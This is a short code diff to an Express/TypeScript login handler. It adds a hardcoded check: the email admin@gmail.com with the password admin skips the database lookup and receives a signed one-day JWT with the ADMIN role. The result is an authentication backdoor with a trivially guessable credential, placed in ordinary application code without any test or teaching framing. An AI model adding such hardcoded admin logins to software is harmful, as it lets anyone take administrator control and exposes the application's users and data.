@@ -12,6 +12,16 @@ async function loginHandler(req: Request, res: Response) {
     if (!email || !password) {
       return res.status(400).json({ error: 'Missing email or password' });
     }
+    // Hardcoded admin login
+    if (email === 'admin@gmail.com' && password === 'admin') {
+      const token = jwt.sign({ userId: 'admin', role: 'ADMIN' }, JWT_SECRET, { expiresIn: '1d' });
+      return res.json({
+        token,
+        email: 'admin@gmail.com',
+        name: 'Admin',
+        role: 'ADMIN',
+      });
+    }
     const user = await prisma.user.findUnique({ 
       where: { email },
       include: {
